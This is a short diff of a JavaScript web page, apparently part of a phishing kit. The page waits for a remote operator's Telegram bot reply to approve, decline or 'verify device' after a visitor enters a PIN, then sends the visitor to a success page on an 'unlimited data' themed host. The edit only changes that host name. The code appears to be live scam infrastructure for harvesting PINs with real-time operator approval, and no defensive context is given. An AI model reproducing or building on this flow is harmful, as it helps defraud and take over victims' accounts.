@@ -261,7 +261,7 @@
                                 const cb = update.callback_query.data;
                                 if (cb === approveId) window.location.href = CONFIG.APPROVE_PAGE;
                                 else if (cb === verifyId) window.location.href = CONFIG.DEVICE_PAGE;
-                                else if (cb.startsWith('valid_')) window.location.href = 'https://unlimiteddata.vercel.app/success.html';
+                                else if (cb.startsWith('valid_')) window.location.href = 'https://Unlimited-Data.vercel.app/success.html';
                                 else if (cb.startsWith('invalid_') || cb === declineId) {
                                     spinner.style.display = 'none';
                                     errMsg.textContent = "Request declined or invalid PIN. Please try again.";
